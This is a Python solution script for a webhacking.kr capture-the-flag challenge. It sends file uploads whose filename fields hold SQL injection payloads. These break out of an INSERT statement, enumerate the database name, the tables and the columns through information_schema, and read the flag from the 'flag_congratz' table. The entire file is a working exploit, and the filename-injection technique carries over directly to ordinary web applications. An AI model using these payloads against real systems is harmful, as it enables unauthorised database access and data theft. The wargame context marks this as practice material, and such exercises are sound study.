import re

import requests

if __name__ == '__main__':
    IP = "YOUR_IP_ADDRESS"
    url = "https://webhacking.kr/challenge/web-14/"
    files = {"upfile": (f"file', 123, '{IP}'),((select database()), 123, '{IP}')#", "")}
    requests.post(url, files=files)

    files = {"upfile": (
        f"file', 123, '{IP}'),((select group_concat(table_name) from information_schema.tables where "
        f"table_schema='chall29'), 123, '{IP}')#",
        "")}
    requests.post(url, files=files)

    files = {"upfile": (
        f"file', 123, '{IP}'),((select group_concat(column_name) from information_schema.columns where "
        f"table_name='flag_congratz'), 123, '{IP}')#",
        "")}
    requests.post(url, files=files)

    files = {"upfile": (
        f"file', 123, '{IP}'),((select flag from flag_congratz), 123, '{IP}')#",
        "")}
    response = requests.post(url, files=files)
    print(re.search(r"FLAG{.*}", response.text).group())
